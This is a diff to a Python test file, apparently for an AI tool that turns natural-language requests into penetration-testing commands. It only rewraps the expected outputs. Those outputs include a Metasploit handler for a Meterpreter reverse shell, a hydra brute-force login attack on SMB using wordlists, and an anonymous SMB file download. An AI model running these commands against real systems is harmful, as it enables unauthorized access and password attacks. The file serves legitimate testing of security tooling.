@@ -41,7 +41,10 @@ def test_modify_command_dialog_avoidance(mock_modify, settings, mock_command_res
     expected_result = GraphState(
         query="Start a Metasploit handler",
         context={},
-        command_candidates=["msfconsole -q -x \"use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST 10.10.10.1; set LPORT 4444; run; exit -y\""]
+        command_candidates=[
+            "msfconsole -q -x \"use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; "
+            "set LHOST 10.10.10.1; set LPORT 4444; run; exit -y\""
+        ]
     )
     mock_modify.return_value = expected_result
 
@@ -67,7 +70,10 @@ def test_modify_command_list_files(mock_modify, settings, mock_list_files_respon
     expected_result = GraphState(
         query="Brute force SMB login",
         context={},
-        command_candidates=["hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/seclists/Passwords/xato-net-10-million-passwords-1000.txt smb://10.10.10.40"]
+        command_candidates=[
+            "hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt "
+            "-P /usr/share/seclists/Passwords/xato-net-10-million-passwords-1000.txt smb://10.10.10.40"
+        ]
     )
     mock_modify.return_value = expected_result
 
@@ -94,7 +100,9 @@ def test_modify_command_both_modifications(mock_modify, settings):
     expected_result = GraphState(
         query="Download user list from SMB share",
         context={},
-        command_candidates=["smbclient -N //10.10.10.40/share -c 'get /usr/share/seclists/Usernames/top-usernames-shortlist.txt'"]
+        command_candidates=[
+            "smbclient -N //10.10.10.40/share -c 'get /usr/share/seclists/Usernames/top-usernames-shortlist.txt'"
+        ]
     )
     mock_modify.return_value = expected_result
 
@@ -162,7 +170,8 @@ def test_modify_command_multiple_commands(mock_modify, settings):
         context={},
         command_candidates=[
             "msfconsole -q -x \"use exploit/multi/handler; exit -y\"",
-            "hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/seclists/Passwords/xato-net-10-million-passwords-1000.txt smb://10.10.10.40"
+            "hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt "
+            "-P /usr/share/seclists/Passwords/xato-net-10-million-passwords-1000.txt smb://10.10.10.40"
         ]
     )
     mock_modify.return_value = expected_result
